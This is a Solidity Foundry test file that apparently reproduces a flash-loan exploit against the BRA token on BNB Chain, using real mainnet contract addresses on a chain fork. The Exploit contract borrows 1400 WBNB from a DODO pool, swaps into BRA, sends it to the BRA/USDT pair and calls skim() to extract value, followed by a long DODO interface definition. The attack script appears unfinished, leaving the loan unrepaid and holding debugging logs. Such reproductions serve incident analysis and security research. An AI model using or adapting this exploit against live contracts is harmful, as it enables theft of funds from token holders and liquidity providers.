// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/interface/interface.sol";

contract AttackerTest is Test {
    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Exploit public exploit;

    function setUp() public {
        vm.createSelectFork("bsc", 24655771);
        exploit = new Exploit();
    }

    function testExploit() public {
        console2.log("Befor ", wbnb.balanceOf(address(this)));
        exploit.go();
        console2.log("after ", wbnb.balanceOf(address(this)));
    }
}

contract Exploit {
    IDPPAdvanced constant dppAdvanced =
        IDPPAdvanced(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUSDT constant usdt = IUSDT(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant bra = IERC20(0x449FEA37d339a11EfE1B181e5D5462464bBa3752);
    IPancakeRouter constant pancakeRouter =
        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    address BRA_USDT_Pair = 0x8F4BA1832611f0c364dE7114bbff92ba676AdF0E;

    receive() external payable {}

    function go() public {
        console2.log("Flashloan 1400 WBNB from DODO");
        uint256 baseAmount = 1400 * 1e18;
        address assetTo = address(this);
        bytes memory data = "xxas";
        dppAdvanced.flashLoan(baseAmount, 0, assetTo, data);
        // send back attacker
        console2.log("111");
        uint256 profit = wbnb.balanceOf(address(this));
        console2.log(" ~ go ~ profit:", profit);
        console2.log("profit: ", profit);
    }

    function DPPFlashLoanCall(
        address,
        uint256 baseAmount,
        uint256,
        bytes memory
    ) external {
        console2.log("flashloan attacks", baseAmount);
        address[] memory swapPath = new address[](3);
        console2.log("amoun WBNB: ", wbnb.balanceOf(address(this)));
        wbnb.withdraw(baseAmount);
        console2.log("amoun WBNB: ", wbnb.balanceOf(address(this)));
        console2.log("amoun WBNB: ", wbnb.balanceOf(address(wbnb)));
        // sell BNB
        swapPath[0] = address(wbnb);
        swapPath[1] = address(usdt);
        swapPath[2] = address(bra);
        pancakeRouter.swapExactETHForTokens{value: 1000 ether}(
            1,
            swapPath,
            address(this),
            block.timestamp
        );
        uint256 pairBalanceBefore = bra.balanceOf(BRA_USDT_Pair);
        console2.log(" ~ pairBalanceBefore:", pairBalanceBefore);
        uint256 sendAmount = bra.balanceOf(address(this));
        console.log(" ~ sendAmount:", sendAmount);
        bra.transfer(BRA_USDT_Pair, sendAmount);

        //for (uint256 i; i < 101; ++i) {
        IPancakePair(BRA_USDT_Pair).skim(BRA_USDT_Pair);
        //}
        uint256 pairBalancerAfter = bra.balanceOf(BRA_USDT_Pair);
        console.log(" ~ pairBalancerAfter:", pairBalancerAfter);
    }
}

/*---------- Interface ----------*/
interface IDPPAdvanced {
    event DODOFlashLoan(
        address borrower,
        address assetTo,
        uint256 baseAmount,
        uint256 quoteAmount
    );
    event DODOSwap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 toAmount,
        address trader,
        address receiver
    );
    event LpFeeRateChange(uint256 newLpFeeRate);
    event OwnershipTransferPrepared(
        address indexed previousOwner,
        address indexed newOwner
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event RChange(uint8 newRState);

    struct PMMState {
        uint256 i;
        uint256 K;
        uint256 B;
        uint256 Q;
        uint256 B0;
        uint256 Q0;
        uint8 R;
    }

    function _BASE_PRICE_CUMULATIVE_LAST_() external view returns (uint256);
    function _BASE_RESERVE_() external view returns (uint112);
    function _BASE_TARGET_() external view returns (uint112);
    function _BASE_TOKEN_() external view returns (address);
    function _BLOCK_TIMESTAMP_LAST_() external view returns (uint32);
    function _IS_OPEN_TWAP_() external view returns (bool);
    function _I_() external view returns (uint128);
    function _K_() external view returns (uint64);
    function _LP_FEE_RATE_() external view returns (uint64);
    function _MAINTAINER_() external view returns (address);
    function _MT_FEE_RATE_MODEL_() external view returns (address);
    function _NEW_OWNER_() external view returns (address);
    function _OWNER_() external view returns (address);
    function _QUOTE_RESERVE_() external view returns (uint112);
    function _QUOTE_TARGET_() external view returns (uint112);
    function _QUOTE_TOKEN_() external view returns (address);
    function _RState_() external view returns (uint32);
    function claimOwnership() external;
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes memory data
    ) external;
    function getBaseInput() external view returns (uint256 input);
    function getMidPrice() external view returns (uint256 midPrice);
    function getPMMState() external view returns (PMMState memory state);
    function getPMMStateForCall()
        external
        view
        returns (
            uint256 i,
            uint256 K,
            uint256 B,
            uint256 Q,
            uint256 B0,
            uint256 Q0,
            uint256 R
        );
    function getQuoteInput() external view returns (uint256 input);
    function getUserFeeRate(
        address user
    ) external view returns (uint256 lpFeeRate, uint256 mtFeeRate);
    function getVaultReserve()
        external
        view
        returns (uint256 baseReserve, uint256 quoteReserve);
    function init(
        address owner,
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 k,
        uint256 i,
        bool isOpenTWAP
    ) external;
    function initOwner(address newOwner) external;
    function querySellBase(
        address trader,
        uint256 payBaseAmount
    )
        external
        view
        returns (
            uint256 receiveQuoteAmount,
            uint256 mtFee,
            uint8 newRState,
            uint256 newBaseTarget
        );
    function querySellQuote(
        address trader,
        uint256 payQuoteAmount
    )
        external
        view
        returns (
            uint256 receiveBaseAmount,
            uint256 mtFee,
            uint8 newRState,
            uint256 newQuoteTarget
        );
    function ratioSync() external;
    function reset(
        address assetTo,
        uint256 newLpFeeRate,
        uint256 newI,
        uint256 newK,
        uint256 baseOutAmount,
        uint256 quoteOutAmount,
        uint256 minBaseReserve,
        uint256 minQuoteReserve
    ) external returns (bool);
    function retrieve(address to, address token, uint256 amount) external;
    function sellBase(address to) external returns (uint256 receiveQuoteAmount);
    function sellQuote(address to) external returns (uint256 receiveBaseAmount);
    function transferOwnership(address newOwner) external;
    function tuneParameters(
        uint256 newLpFeeRate,
        uint256 newI,
        uint256 newK,
        uint256 minBaseReserve,
        uint256 minQuoteReserve
    ) external returns (bool);
    function tunePrice(
        uint256 newI,
        uint256 minBaseReserve,
        uint256 minQuoteReserve
    ) external returns (bool);
    function version() external pure returns (string memory);
}
